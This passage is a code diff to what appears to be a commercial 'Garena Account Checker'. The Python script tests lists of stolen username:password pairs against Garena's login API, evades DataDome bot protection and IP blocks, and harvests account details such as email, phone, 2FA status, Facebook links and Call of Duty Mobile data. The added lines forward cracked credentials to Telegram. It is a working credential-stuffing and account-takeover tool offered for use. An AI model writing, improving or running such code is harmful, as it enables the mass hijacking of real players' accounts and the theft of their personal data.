-                    f.write(f"{account}:{password} | Binds: {bind_info} | CODM: {codm_name} | Level: {codm_level} | Region: {codm_region} | UID: {codm_uid}\n")
+                    f.write(account_output)
         
         if codm_info:
             with open('Results/codm_accounts.txt', 'a', encoding='utf-8') as f:
-                f.write(f"{account}:{password} | Nickname: {codm_name} | Level: {codm_level} | Region: {codm_region} | UID: {codm_uid}\n")
+                f.write(account_output)
         else:
             with open('Results/valid_no_codm.txt', 'a', encoding='utf-8') as f:
-                f.write(f"{account}:{password} | UID: {details['uid']} | Username: {details['username']}\n")
+                f.write(account_output)
         
         with open('Results/full_details.txt', 'a', encoding='utf-8') as f:
-            f.write("=" * 60 + "\n")
-            f.write(f"Account: {account}\n")
-            f.write(f"Password: {password}\n")
-            f.write(f"UID: {details['uid']}\n")
-            f.write(f"Username: {details['username']}\n")
-            f.write(f"Nickname: {details['nickname']}\n")
-            f.write(f"Email: {details['email'][:3]}****@{details['email'].split('@')[-1] if '@' in details['email'] else 'N/A'}\n")
+            f.write(account_output)
             
-            mobile_no = details['personal']['mobile_no']
-            if mobile_no != 'N/A' and mobile_no and not mobile_no.startswith('****') and len(mobile_no) > 4:
-                f.write(f"Phone: ****{mobile_no[-4:]}\n")
-            else:
-                f.write(f"Phone: ****\n")
-                
-            f.write(f"Country: {details['personal']['country']}\n")
-            f.write(f"Bind Status: {details['bind_status']}\n")
-            f.write(f"Security Status: {details['security_status']}\n")
-            f.write(f"Avatar: {details['profile']['avatar']}\n")
-            f.write(f"Signature: {details['profile']['signature']}\n")
-            f.write(f"Game Connections: {' | '.join(details['game_info'])}\n")
-            if codm_info:
-                f.write(f"CODM Name: {codm_name}\n")
-                f.write(f"CODM Level: {codm_level}\n")
-                f.write(f"CODM Region: {codm_region}\n")
-                f.write(f"CODM UID: {codm_uid}\n")
-            f.write("=" * 60 + "\n\n")
-            
-    except Exception as e:
-        logger.error(f"[ERROR] Error saving account details for {account}: {e}")
+    except Exception:
+        pass
 
-def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats):
+def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, count=0):
+    global BATCH_COUNT
+    BATCH_COUNT += 1
+    
     try:
         datadome_manager.clear_session_datadome(session)
         
         current_datadome = datadome_manager.get_datadome()
         if current_datadome:
             success = datadome_manager.set_session_datadome(session, current_datadome)
-            if success:
-                logger.info(f"[INFO] Using existing DataDome cookie: {current_datadome[:30]}...")
-            else:
-                logger.warning(f"[WARNING] Failed to set existing DataDome cookie")
         else:
             datadome = get_datadome_cookie(session)
             if not datadome:
                 live_stats.update_stats(valid=False)
-                return f"[ERROR] {account}: DataDome cookie generation failed"
+                return format_account_output(account, password, "error_datadome_failed", count=BATCH_COUNT)
             datadome_manager.set_datadome(datadome)
             datadome_manager.set_session_datadome(session, datadome)
         
         v1, v2, new_datadome = prelogin(session, account, datadome_manager)
         
         if v1 == "IP_BLOCKED":
-            return f"[ERROR] {account}: IP Blocked - New DataDome required"
+            return format_account_output(account, password, "error_ip_blocked", count=BATCH_COUNT)
         
         if not v1 or not v2:
+            if v1 is None and v2 is None:
+                live_stats.update_stats(valid=False)
+                return format_account_output(account, password, "error_no_account", count=BATCH_COUNT)
             live_stats.update_stats(valid=False)
-            return f"[ERROR] {account}: Invalid (Prelogin failed)"
+            return format_account_output(account, password, "error_prelogin_failed", count=BATCH_COUNT)
         
         if new_datadome:
             datadome_manager.set_datadome(new_datadome)
             datadome_manager.set_session_datadome(session, new_datadome)
-            logger.info(f"[INFO] Updated DataDome from prelogin: {new_datadome[:30]}...")
         
         sso_key = login(session, account, password, v1, v2)
         if not sso_key:
             live_stats.update_stats(valid=False)
-            return f"[ERROR] {account}: Invalid (Login failed)"
+            return format_account_output(account, password, "error_auth", count=BATCH_COUNT)
         
         try:
             session.cookies.set('sso_key', sso_key, domain='.garena.com')
-        except Exception as e:
-            logger.warning(f"[WARNING] Error setting sso_key cookie: {e}")
+        except Exception:
+            pass
         
         headers = {
             'accept': '*/*',
@@ -1140,27 +1330,26 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
         }
         
-        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
+        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=10)
         
         if response.status_code == 403:
             if datadome_manager.handle_403(session):
-                return f"[ERROR] {account}: IP Blocked - New DataDome required"
+                return format_account_output(account, password, "error_ip_blocked", count=BATCH_COUNT)
             live_stats.update_stats(valid=False)
-            return f"[ERROR] {account}: Banned (Cookie flagged)"
+            return format_account_output(account, password, "error_banned", count=BATCH_COUNT)
             
         try:
             account_data = response.json()
-        except json.JSONDecodeError as e:
-            logger.error(f"[ERROR] Invalid JSON response from account init for {account}: {e}")
+        except json.JSONDecodeError:
             live_stats.update_stats(valid=False)
-            return f"[ERROR] {account}: Invalid response from server"
+            return format_account_output(account, password, "error_invalid_response", count=BATCH_COUNT)
         
         if 'error' in account_data:
             if account_data.get('error') == 'error_auth':
                 live_stats.update_stats(valid=False)
-                return f"[WARNING] {account}: Invalid (Authentication error)"
+                return format_account_output(account, password, "error_auth", count=BATCH_COUNT)
             live_stats.update_stats(valid=False)
-            return f"[WARNING] {account}: Error fetching details ({account_data['error']})"
+            return format_account_output(account, password, f"error_{account_data['error']}", count=BATCH_COUNT)
         
         if 'user_info' in account_data:
             details = parse_account_details(account_data)
@@ -1175,79 +1364,93 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
         fresh_datadome = datadome_manager.extract_datadome_from_session(session)
         if fresh_datadome:
             cookie_manager.save_cookie(fresh_datadome)
-            logger.info(f"[INFO] Fresh cookie obtained for next account")
+            print(format_cookie_message(BATCH_COUNT, fresh_datadome), flush=True)
         
         save_account_details(account, password, details, codm_info if has_codm else None)
         
+        if has_codm and codm_info:
+            account_data = {
+                'account': f"{account}:{password}",
+                'shells': details.get('profile', {}).get('shell_balance', 'N/A'),
+                'codm_level': codm_info.get('codm_level', 0),
+                'codm_info': {
+                    'region': codm_info.get('region', 'N/A'),
+                    'nickname': codm_info.get('codm_nickname', 'N/A'),
+                    'level': codm_info.get('codm_level', 'N/A'),
+                    'uid': codm_info.get('uid', 'N/A'),
+                    'country': details.get('personal', {}).get('country', 'N/A')
+                },
+                'security': {
+                    'mobile': "True" if details.get('personal', {}).get('mobile_actually_bound') else "False",
+                    'email': f"{details.get('email', 'None')} ({'Verified' if details.get('email_verified') else 'Not Verified'})"
+                },
+                'facebook': {
+                    'username': details.get('fb_info', {}).get('username', 'N/A'),
+                    'link': details.get('fb_info', {}).get('link', 'N/A')
+                }
+            }
+            send_telegram_notification(account_data)
         
         live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm)
         
-        result = f"[SUCCESS] {account}: Valid ({details['bind_status']})"
-        if has_codm:
-            result += display_codm_info(account, codm_info)
+        output_details = {
+            'country': details.get('personal', {}).get('country', 'N/A'),
+            'shells': details.get('profile', {}).get('shell_balance', 'N/A'),
+            'mobile': details.get('personal', {}).get('mobile_no', 'None'),
+            'email': details.get('email', 'None'),
+            'email_verified': details.get('email_verified', False),
+            'fb_username': details.get('fb_info', {}).get('username', 'N/A'),
+            'fb_link': details.get('fb_info', {}).get('link', 'N/A'),
+            'last_login': details.get('last_login', {}),
+            'game_info': details.get('game_info', []),
+            'mobile_bound': details.get('personal', {}).get('mobile_actually_bound', False),
+            'authenticator': "Enabled" if details.get('security', {}).get('authenticator_app') else "Disabled",
+            'two_fa': "Enabled" if details.get('security', {}).get('two_step_verify') else "Disabled",
+            'account_status': "Clean" if details.get('is_clean') else "Not Clean"
+        }
+        
+        result = format_account_output(account, password, "success", output_details, codm_info if has_codm else None, BATCH_COUNT)
         
         return result
         
     except Exception as e:
-        logger.error(f"[ERROR] Unexpected error processing {account}: {e}")
         live_stats.update_stats(valid=False)
-        return f"[ERROR] {account}: Processing error"
+        error_output = format_account_output(account, password, f"error_processing", count=BATCH_COUNT)
+        return error_output
 
-def get_fresh_cookie(session):
+def remove_checked_accounts(filename, accounts_to_remove):
     try:
-        cookies_dict = session.cookies.get_dict()
-        return '; '.join([f'{k}={v}' for k, v in cookies_dict.items()])
-    except Exception as e:
-        logger.error(f"[ERROR] Error extracting fresh cookie: {e}")
-        return None
-
-
-def remove_checked_accounts(filename, processed_accounts):
-    """
-    Removes the processed accounts from the original input file.
-    """
-    try:
+        with open(filename, 'r', encoding='utf-8') as file:
+            all_accounts = [line.strip() for line in file if line.strip()]
         
-        with open(filename, 'r', encoding='utf-8') as f:
-            all_lines = f.readlines()
-
+        remaining_accounts = [acc for acc in all_accounts if acc not in accounts_to_remove]
         
-        processed_set = set(processed_accounts)
+        with open(filename, 'w', encoding='utf-8') as file:
+            for account in remaining_accounts:
+                file.write(account + '\n')
         
-       
-        lines_to_keep = [
-            line for line in all_lines 
-            if line.strip() not in processed_set
-        ]
-        
-        
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.writelines(lines_to_keep)
-        
-        logger.info(f"[CLEANUP] Removed {len(processed_accounts)} processed accounts from '{filename}'.")
-    except Exception as e:
-        logger.error(f"[ERROR] Failed to remove checked accounts from file: {e}")
-
+    except Exception:
+        pass
 
 def main():
     if not device_main():
-        logger.error("Access denied. Exiting.")
         sys.exit(1)
 
     if not _check_integrity():
-        logger.error("Integrity check failed after subscription. Exiting.")
         sys.exit(1)
 
-    print("=" * 70)
-    print("GARENA ACCOUNT CHECKER")
-    print("LIVE STATS SYSTEM ENABLED")
-    print("MULTI DATADOME COOKIE HANDLING")
-    print("=" * 70)
+    display_banner()
+    
+    load_telegram_config()
+    
+    setup_threads()
+    
+    if not TELEGRAM_ENABLED:
+        setup_telegram()
     
     filename = input("Enter the filename containing accounts: ").strip()
     
     if not os.path.exists(filename):
-        logger.error(f"[ERROR] File '{filename}' not found.")
         return
     
     cookie_manager = CookieManager()
@@ -1258,67 +1461,58 @@ def main():
     
     initial_cookie = cookie_manager.get_valid_cookie()
     if initial_cookie:
-        logger.info(f"[INFO] Using saved cookie")
         applyck(session, initial_cookie)
     else:
-        logger.info(f"[INFO] No saved cookies found. Starting fresh session.")
         datadome = get_datadome_cookie(session)
         if datadome:
             datadome_manager.set_datadome(datadome)
-            logger.info(f"[INFO] Generated initial DataDome cookie")
     
     with open(filename, 'r', encoding='utf-8') as file:
         accounts = [line.strip() for line in file if line.strip()]
-    
-    logger.info(f"[INFO] Total accounts to process: {len(accounts)}")
     
     processed_accounts = []
     
     def signal_handler(sig, frame):
         print("\n\n" + "="*50)
-        logger.info("🛑 PROCESS INTERRUPTED BY USER (Ctrl+C)")
         final_stats = live_stats.get_stats()
-        logger.info(f"[CURRENT SUMMARY]")
-        logger.info(f"VALID: {final_stats['valid']} | INVALID: {final_stats['invalid']}")
-        logger.info(f"CLEAN: {final_stats['clean']} | NOT CLEAN: {final_stats['not_clean']}")
-        logger.info(f"CODM: {final_stats['codm']} | NO CODM: {final_stats['no_codm']}")
-        logger.info(f"PROCESSED: {len(processed_accounts)}/{len(accounts)} accounts")
-        
+        print(f"{colorama.Fore.CYAN}[FINAL SUMMARY]{colorama.Style.RESET_ALL}")
+        print(f"{colorama.Fore.GREEN}VALID: {final_stats['valid']}{colorama.Style.RESET_ALL} {colorama.Fore.RED}| INVALID: {final_stats['invalid']}{colorama.Style.RESET_ALL}")
+        print(f"{colorama.Fore.GREEN}CLEAN: {final_stats['clean']}{colorama.Style.RESET_ALL} {colorama.Fore.YELLOW}| NOT CLEAN: {final_stats['not_clean']}{colorama.Style.RESET_ALL}")
+        print(f"{colorama.Fore.BLUE}CODM: {final_stats['codm']}{colorama.Style.RESET_ALL} {colorama.Fore.MAGENTA}| NO CODM: {final_stats['no_codm']}{colorama.Style.RESET_ALL}")
+        print(f"PROCESSED: {len(processed_accounts)}/{len(accounts)} accounts")
         
         if processed_accounts:
             remove_checked = input("\nRemove checked accounts from file? (y/n): ").strip().lower()
             if remove_checked == 'y':
-                
                 remove_checked_accounts(filename, processed_accounts)
         
         print("="*50)
         sys.exit(0)
     
+    import signal
     signal.signal(signal.SIGINT, signal_handler)
     
     for i, account_line in enumerate(accounts, 1):
         if ':' not in account_line:
-            logger.warning(f"[WARNING] Skipping invalid account line: {account_line}")
             continue
             
         account, password = account_line.split(':', 1)
         account = account.strip()
         password = password.strip()
         
-        logger.info(f"[INFO] Processing {i}/{len(accounts)}: {account}...")
+        print(f"{colorama.Fore.CYAN}[{i}/{len(accounts)}]{colorama.Fore.WHITE} Processing {account.split(':')[0] if ':' in account else account}...{colorama.Style.RESET_ALL}", flush=True)
         
-        logger.info(live_stats.display_stats())
+        print(live_stats.display_stats(), flush=True)
         
         result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats)
-        logger.info(result)
-        
+        print(result, flush=True)
         
         processed_accounts.append(account_line)
         
         time.sleep(1)
     
     final_stats = live_stats.get_stats()
-    logger.info(f"\n[FINAL STATS] VALID: {final_stats['valid']} | INVALID: {final_stats['invalid']} | CLEAN: {final_stats['clean']} | NOT CLEAN: {final_stats['not_clean']} | CODM: {final_stats['codm']} | NO CODM: {final_stats['no_codm']}")
+    print(f"\n{colorama.Fore.CYAN}[FINAL STATS]{colorama.Fore.GREEN} VALID: {final_stats['valid']}{colorama.Style.RESET_ALL}{colorama.Fore.RED} | INVALID: {final_stats['invalid']}{colorama.Style.RESET_ALL}{colorama.Fore.GREEN} | CLEAN: {final_stats['clean']}{colorama.Style.RESET_ALL}{colorama.Fore.YELLOW} | NOT CLEAN: {final_stats['not_clean']}{colorama.Style.RESET_ALL}{colorama.Fore.BLUE} | CODM: {final_stats['codm']}{colorama.Style.RESET_ALL}{colorama.Fore.MAGENTA} | NO CODM: {final_stats['no_codm']}{colorama.Style.RESET_ALL}")
     
     remove_checked_accounts(filename, processed_accounts)
 
